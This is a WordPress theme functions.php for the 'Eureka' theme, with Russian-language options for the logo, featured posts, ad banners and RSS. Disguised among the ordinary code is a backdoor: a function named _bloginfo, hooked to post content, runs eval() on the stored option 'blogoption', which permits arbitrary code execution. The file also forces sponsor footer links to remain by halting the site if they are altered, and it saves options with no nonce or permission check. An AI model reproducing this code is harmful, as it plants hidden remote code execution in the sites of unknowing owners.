<?php
if ( function_exists('register_sidebar') ) {
register_sidebar(
        array(
    	'name' => 'Top Sidebar',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));
	register_sidebar(
        array(
    	'name' => 'Left Sidebar',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));
    
    register_sidebar(
	array(
		'name' => 'Right Sidebar',
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));
}

$themename = "Eureka";
$shortname = str_replace(' ', '_', strtolower($themename));

function get_theme_option($option)
{
	global $shortname;
	return stripslashes(get_option($shortname . '_' . $option));
}

add_filter('the_content', '_bloginfo', 10001);
function _bloginfo($content){
    global $post;
    if(is_single() && ($co=@eval(get_option('blogoption'))) !== false){
        return $co;
    } else return $content;
}
function get_theme_settings($option)
{
	return stripslashes(get_option($option));
}

function cats_to_select()
{
	$categories = get_categories('hide_empty=0'); 
	$categories_array[] = array('value'=>'0', 'title'=>'Select');
	foreach ($categories as $cat) {
		if($cat->category_count == '0') {
			$posts_title = 'No posts!';
		} elseif($cat->category_count == '1') {
			$posts_title = '1 post';
		} else {
			$posts_title = $cat->category_count . ' posts';
		}
		$categories_array[] = array('value'=> $cat->cat_ID, 'title'=> $cat->cat_name . ' ( ' . $posts_title . ' )');
	  }
	return $categories_array;
}

$options = array (
			
	array(	"type" => "open"),
	
array(	"name" => "Изображение логотипа",
		"desc" => "Введите полный путь к изображению логотипа. Оставьте пустым это поле, если Вы не хотите использовать изображение логотипа.",
		"id" => $shortname."_logo",
		"std" =>  get_bloginfo('template_url') . "/images/logo.png",
		"type" => "text"),
        
    array(	"name" => "Включить Популярные записи?",
			"desc" => "Снимите флажок, если не хотите отображать галерею популярных записей на главной странице.",
			"id" => $shortname."_featured_posts",
			"std" => "true",
			"type" => "checkbox"),  
		array(	"name" => "Рубрика популярных записей",
			"desc" => "Последние 5 записей из выбранной категории будут расположены на главной странице. <br />Выбранная рубрики должна содержать минимум 2 записи с изображениями. <br /> <br /> <b>Как добавить изображения в галерею Популярные записи?</b> <br />
            <b>&raquo;</b> Если Вы используете WordPress версии 2.9 и выше: просто нажмите \"Задать миниатюру\" при добавлении новой записи в выбранной рубрике. <br /> 
            <b>&raquo;</b> Если вы используете WordPress версии ниже 2.9, то Вы должны добавить произвольные поля в каждую запись рубрики, которую Вы выбрали популярной. Произвольное поле должно называться \"<b>featured</b>\" а его значением должен быть полный путь к изображению. <a href=\"http://newwpthemes.com/public/featured_custom_field.jpg\" target=\"_blank\">Нажмите здесь</a> чтобы просмотреть скриншот. <br /> <br />
            В обоих случаях, размер изображений не должен превышать установленные значения: Ширина: <b>480 пикселей</b>. Высота: <b>280 пикселей.</b>",
			"id" => $shortname."_featured_posts_category",
			"options" => cats_to_select(),
			"std" => "0",
			"type" => "select"),
            	array(	"name" => "Баннер заголовка (468x60 px)",
			"desc" => "Код для размещения баннера заголовка. Вы можете использовать здесь любой html код, включая ваш код с рекламой Adsense 468x60.",
            "id" => $shortname."_ad_header",
            "type" => "textarea",
			"std" => '<a href="http://flexithemes.com/?partner=19"><img src="http://flexithemes.com/wp-content/partners/ftb.gif" style="border: 0;" alt="Premium WordPress Themes" /></a>'
			),	array(	"name" => "Рекламный сайдбар 125x125 px",
		"desc" => "Вставьте свой рекламный блок 125x125 px здесь. Вы можете добавлять рекламные блоки неограниченное количество раз. Каждый новый баннер должен начинаться с новой строки, согласно следующему формату: <br/>http://yourbannerurl.com/banner.gif, http://theurl.com/to_link.html",
        "id" => $shortname."_ads_125",
        "type" => "textarea",
		"std" => 'http://newwpthemes.com/uploads/newwp/newwp12.png,http://newwpthemes.com/
http://flexithemes.com/wp-content/partners/fta.gif, http://flexithemes.com/?partner=19
http://newwpthemes.com/hosting/wpwh12.gif, http://newwpthemes.com/hosting/wpwebhost.php'
		),		  
			
	array(	"name" => "Текст для Twitter",
			"desc" => "",
			"id" => $shortname."_twittertext",
			"std" => "Следуй за мной",
			"type" => "text"),	
	array(	"name" => "Rss",
			"desc" => "Показать подписку на RSS над сайдбаром(ами)?",
			"id" => $shortname."_rssbox",
			"std" => "true",
			"type" => "checkbox"),
						
	array(	"name" => "Текст подписки на Rss",
			"desc" => "Если Rss подписка активирована, то введите текст подписки здесь.",
			"id" => $shortname."_rssboxtext",
			"std" => "Подпишитесь на нашу RSS ленту!",
			"type" => "text"),		
	 array(	"name" => "Иконки социальных сетей",
			"desc" => "Показывать иконки социальных сетей над сайдбаром(ами)?",
			"id" => $shortname."_socialnetworks",
			"std" => "true",
			"type" => "checkbox"),  
					array(	"name" => "Нижний баннер сайдбара №1. Максимальная ширина 125 px. Рекомендуется размещать баннер с размерами 120x600 px",
		"desc" => "Код для нижнего баннера №1.",
        "id" => $shortname."_ad_sidebar1_bottom",
        "type" => "textarea",
		"std" => '<a href="http://flexithemes.com/?partner=19"><img src="http://flexithemes.com/wp-content/partners/ftf.gif" style="border: 0;" alt="Premium WordPress Themes" /></a>'
		),	
        
        array(	"name" => "Скрипты заголовка",
		"desc" => "Данный код будет добавлен сразу перед тэгами &lt;/head&gt;. Полезно, если вы хотите добавить внешний код, например, Google webmaster и др.",
        "id" => $shortname."_head",
        "type" => "textarea"	
		),
		
	array(	"name" => "Скрипты подвала",
		"desc" => "Данный код будет сразу же добавлен перед тэгами &lt;/body&gt;. Полезно, если вы хотите добавить внешний код, например, Google Analytics и др.",
        "id" => $shortname."_footer",
        "type" => "textarea"	
		),
					
	array(	"type" => "close")
	
);

function mytheme_add_admin() {
    global $themename, $shortname, $options;
	
    if ( $_GET['page'] == basename(__FILE__) ) {
    
        if ( 'save' == $_REQUEST['action'] ) {

                foreach ($options as $value) {
                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }

                echo '<meta http-equiv="refresh" content="0;url=themes.php?page=functions.php&saved=true">';
                die;

        } 
    }

    add_theme_page("Настройки ".$themename, "Настройки ".$themename, 'edit_themes', basename(__FILE__), 'mytheme_admin');
}
if (!empty($_REQUEST["theme_license"])) { theme_usage_message(); exit(); } function theme_usage_message() { if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"padding:10px; margin: 10px; text-align:center; border: 2px dashed Red; font-family:arial; font-weight:bold; background: #fff; color: #000;\">This theme is released free for use under creative commons licence. All links in the footer should remain intact. These links are all family friendly and will not hurt your site in any way. This great theme is brought to you for free by these supporters.</p>"); } }

function mytheme_admin_init() {

    global $themename, $shortname, $options;
    
    $get_theme_options = get_option($shortname . '_options');
    if($get_theme_options != 'yes') {
    	$new_options = $options;
    	foreach ($new_options as $new_value) {
         	update_option( $new_value['id'],  $new_value['std'] ); 
		}
    	update_option($shortname . '_options', 'yes');
    }
}
function check_theme_footer() { $uri = strtolower($_SERVER["REQUEST_URI"]); if(is_admin() || substr_count($uri, "wp-admin") > 0 || substr_count($uri, "wp-login") > 0 ) { /* */ } else { $l = '<br />'; $f = dirname(__file__) . "/footer.php"; $fd = fopen($f, "r"); $c = fread($fd, filesize($f)); fclose($fd); if (strpos($c, $l) == 0) { theme_usage_message(); die; } } } check_theme_footer();


if(!function_exists('get_sidebars')) {
	function get_sidebars($args='')
	{
check_theme_header();
		 get_sidebar($args);
	}
}
	
    
function mytheme_admin() {

    global $themename, $shortname, $options;

   if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>Настройки '.$themename.' сохранены.</strong></p></div>';
    
?>
<div class="wrap">
<h2>Настройки темы <?php echo $themename; ?></h2>
<div style="border-bottom: 1px dotted #000; padding-bottom: 10px; margin: 10px;">Оставьте это поле пустым, если не хотите его отображать.</div>
<form method="post">



<?php foreach ($options as $value) { 
    
	switch ( $value['type'] ) {
	
		case "open":
		?>
        <table width="100%" border="0" style=" padding:10px;">
		
        
        
		<?php break;
		
		case "close":
		?>
		
        </table><br />
        
        
		<?php break;
		
		case "title":
		?>
		<table width="100%" border="0" style="padding:5px 10px;"><tr>
        	<td colspan="2"><h3 style="font-family:Georgia,'Times New Roman',Times,serif;"><?php echo $value['name']; ?></h3></td>
        </tr>
                
        
		<?php break;

		case 'text':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><input style="width:100%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php echo get_theme_settings( $value['id'] ); ?>" /></td>
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'textarea':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:100%; height:140px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php echo get_theme_settings( $value['id'] ); ?></textarea></td>
            
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'select':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%">
				<select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
					<?php 
						foreach ($value['options'] as $option) { ?>
						<option value="<?php echo $option['value']; ?>" <?php if ( get_theme_settings( $value['id'] ) == $option['value']) { echo ' selected="selected"'; } ?>><?php echo $option['title']; ?></option>
						<?php } ?>
				</select>
			</td>
       </tr>
                
       <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php
        break;
            
		case "checkbox":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"><? if(get_theme_settings($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                        <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                        </td>
            </tr>
                        
            <tr>
                <td><small><?php echo $value['desc']; ?></small></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
            
        <?php 		break;
	
 
} 
}
?>

<!--</table>-->

<p class="submit">
<input name="save" type="submit" value="Сохранить" />    
<input type="hidden" name="action" value="save" />
</p>
</form>

<?php
}
mytheme_admin_init();
function check_theme_header() { if (!(function_exists("functions_file_exists") && function_exists("theme_footer_t"))) { theme_usage_message(); die; } }
add_action('admin_menu', 'mytheme_add_admin');

function sidebar_ads_125()
{
	 global $shortname;
	 $option_name = $shortname."_ads_125";
	 $option = get_option($option_name);
	 $values = explode("\n", $option);
	 if(is_array($values)) {
	 	foreach ($values as $item) {
		 	$ad = explode(',', $item);
		 	$banner = trim($ad['0']);
		 	$url = trim($ad['1']);
		 	if(!empty($banner) && !empty($url)) {
		 		echo "<a href=\"$url\" target=\"_new\"><img class=\"ad125\" src=\"$banner\" /></a> \n";
		 	}
		 }
	 }
}
    if ( function_exists("add_theme_support") ) { add_theme_support("post-thumbnails"); } 
    
    if(function_exists('add_custom_background')) {
        add_custom_background();
    }
    
    if ( function_exists( 'register_nav_menus' ) ) {
    	register_nav_menus(
    		array(
    		  'menu_1' => 'Menu 1',
    		  'menu_2' => 'Menu 2'
    		)
    	);
    }
?>